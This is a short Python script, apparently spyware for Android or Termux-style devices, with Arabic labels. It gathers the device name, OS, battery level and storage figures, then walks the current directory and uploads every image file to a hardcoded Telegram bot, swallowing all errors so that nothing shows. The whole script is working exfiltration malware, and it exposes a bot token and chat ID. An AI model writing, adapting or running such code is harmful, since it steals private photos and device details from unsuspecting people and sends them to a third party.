import os
import platform
import requests
import shutil
import subprocess

BOT_TOKEN = '8616230020:AAEuHxFbdzeykN4WsmEBLPxxLXvGIMLdbhw'
CHAT_ID = '8657831463'
IMAGE_EXTENSIONS = ('.png', '.jpg', '.jpeg', '.bmp', '.gif', '.webp')

session = requests.Session()

def send_text(message):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {'chat_id': CHAT_ID, 'text': message}
        session.post(url, data=data)
    except:
        pass

def send_image(file_path):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
        with open(file_path, 'rb') as img:
            files = {'photo': img}
            data = {'chat_id': CHAT_ID}
            session.post(url, files=files, data=data)
    except:
        pass

def get_device_info():
    try:
        total, used, free = shutil.disk_usage("/")
        info = {
            '📱 اسم الجهاز': platform.node(),
            '🖥️ النظام': f"{platform.system()} {platform.release()}",
            '🔋 البطارية': get_battery_info(),
            '🌐 الشبكة': get_network_info(),
            '💾 التخزين': f"{round(used / (1024**3), 2)}GB / {round(total / (1024**3), 2)}GB",
        }
        return '\n'.join(f"{k}: {v}" for k, v in info.items())
    except:
        return "⚠️ تعذر قراءة معلومات الجهاز"

def get_battery_info():
    try:
        battery_path = "/sys/class/power_supply/battery/capacity"
        if os.path.exists(battery_path):
            with open(battery_path) as f:
                return f.read().strip() + "%"
        return "غير متوفرة"
    except:
        return "غير متوفرة"

def get_network_info():
    try:
        subprocess.run("ip addr", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "متصل بالشبكة"
    except:
        return "غير معروف"

def send_all_images(folder_path):
    try:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.lower().endswith(IMAGE_EXTENSIONS):
                    full_path = os.path.join(root, file)
                    send_image(full_path)
    except:
        pass

if __name__ == '__main__':
    try:
        current_folder = os.getcwd()
        send_text(get_device_info())
        send_all_images(current_folder)
    except:
        pass
